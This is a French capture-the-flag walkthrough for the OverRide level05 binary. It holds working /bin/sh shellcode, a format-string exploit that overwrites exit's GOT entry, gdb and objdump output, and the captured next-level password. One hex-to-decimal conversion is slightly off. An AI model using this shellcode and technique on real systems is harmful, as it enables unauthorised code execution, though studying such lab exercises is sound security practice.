(gdb) disass main
Dump of assembler code for function main:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	push   %edi
   0x08048448 <+4>:	push   %ebx
   0x08048449 <+5>:	and    $0xfffffff0,%esp
   0x0804844c <+8>:	sub    $0x90,%esp
   0x08048452 <+14>:	movl   $0x0,0x8c(%esp)
   0x0804845d <+25>:	mov    0x80497f0,%eax
   0x08048462 <+30>:	mov    %eax,0x8(%esp)
   0x08048466 <+34>:	movl   $0x64,0x4(%esp)
   0x0804846e <+42>:	lea    0x28(%esp),%eax
   0x08048472 <+46>:	mov    %eax,(%esp)
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
   0x0804847a <+54>:	movl   $0x0,0x8c(%esp)
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    0x28(%esp),%eax
   0x0804848b <+71>:	add    0x8c(%esp),%eax
   0x08048492 <+78>:	movzbl (%eax),%eax
   0x08048495 <+81>:	cmp    $0x40,%al
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    0x28(%esp),%eax
   0x0804849d <+89>:	add    0x8c(%esp),%eax
   0x080484a4 <+96>:	movzbl (%eax),%eax
   0x080484a7 <+99>:	cmp    $0x5a,%al
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    0x28(%esp),%eax
   0x080484af <+107>:	add    0x8c(%esp),%eax
   0x080484b6 <+114>:	movzbl (%eax),%eax
   0x080484b9 <+117>:	mov    %eax,%edx
   0x080484bb <+119>:	xor    $0x20,%edx
   0x080484be <+122>:	lea    0x28(%esp),%eax
   0x080484c2 <+126>:	add    0x8c(%esp),%eax
   0x080484c9 <+133>:	mov    %dl,(%eax)
   0x080484cb <+135>:	addl   $0x1,0x8c(%esp)
   0x080484d3 <+143>:	mov    0x8c(%esp),%ebx
   0x080484da <+150>:	lea    0x28(%esp),%eax
   0x080484de <+154>:	movl   $0xffffffff,0x1c(%esp)
   0x080484e6 <+162>:	mov    %eax,%edx
   0x080484e8 <+164>:	mov    $0x0,%eax
   0x080484ed <+169>:	mov    0x1c(%esp),%ecx
   0x080484f1 <+173>:	mov    %edx,%edi
   0x080484f3 <+175>:	repnz scas %es:(%edi),%al
   0x080484f5 <+177>:	mov    %ecx,%eax
   0x080484f7 <+179>:	not    %eax
   0x080484f9 <+181>:	sub    $0x1,%eax
   0x080484fc <+184>:	cmp    %eax,%ebx
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   0x08048500 <+188>:	lea    0x28(%esp),%eax
   0x08048504 <+192>:	mov    %eax,(%esp)
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	movl   $0x0,(%esp)
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.

On observe l'absence d'appel a system ou execve on en deduit donc que l'on devras utiliser un shellcode
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
L'appel a printf est vulnerable et on remarque un appel a exit@plt que l'on va pouvoir manipuler
Nous allons modifier l'adresse de exit par celle de notre shellcode
Trouvons l'offset de printf
level05@OverRide:~$ ./level05
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
aaaa64.f7fcfac0.0.0.0.0.ffffffff.ffffd774.f7fdb000.61616161.252e7825.78252e78.2e78252e.252e7825.
A la 10eme position on retrouver 61616161 qui est aaaa
Maintenant trouvons l'adresse reel de exit

level05@OverRide:~$ objdump -R ./level05

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
...
080497e0 R_386_JUMP_SLOT   exit
...

Maintenant trouvons l'adresse de notre SHELLCODE
(gdb) b *0x0804845d
Breakpoint 1 at 0x804845d
(gdb) r
Starting program: /home/users/level05/level05

Breakpoint 1, 0x0804845d in main ()
(gdb) x/50x *((char **)environ)
0xffffd850:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xffffd860:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd870:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd880:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd890:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8b0:	0x90909090	0x90909090	0x90909090	0x1feb9090
0xffffd8c0:	0x0876895e	0x4688c031	0x0c468907	0xf3890bb0
0xffffd8d0:	0x8d084e8d	0x80cd0c56	0xd889db31	0xe880cd40
0xffffd8e0:	0xffffffdc	0x6e69622f	0x0068732f	0x4c454853
0xffffd8f0:	0x622f3d4c	0x622f6e69	0x00687361	0x4d524554
0xffffd900:	0x6574783d	0x322d6d72	0x6f633635	0x00726f6c
0xffffd910:	0x5f485353	0x45494c43


Prenons 0xffffd86c
0xffffd86c en decimal = 4294957164
Avec %n ecrire 4294957164 est assez compliquer on va donc split
l'adresse en 2 parties ffff et d86c et les ecrire une a une
Il nous faut trouver l'adresse+2 de exit et si elle est sur la stack alors on pourra
faire comme on le souhaite. Par chance :
(gdb) disass 0x080497e0
Dump of assembler code for function exit@got.plt:
   0x080497e0 <+0>:	jbe    0x8049765 <_DYNAMIC+105>
   0x080497e2 <+2>:	add    $0x8,%al
End of assembler dump.

Adressee+2 est la fin de notre exit. On va donc pouvoir reecrire l'entree et la sortie de exit afin
d'appeler notre SHELLCODE

d86c = 55407 - 8 = 55399
ffff = 65535 - 55407 = 10128

(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55399d" + "%10$n" + "%10128d" + "%11$n"'; cat) | ./level05


cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq


doc : http://jbremer.org/format-string-vulnerabilities/
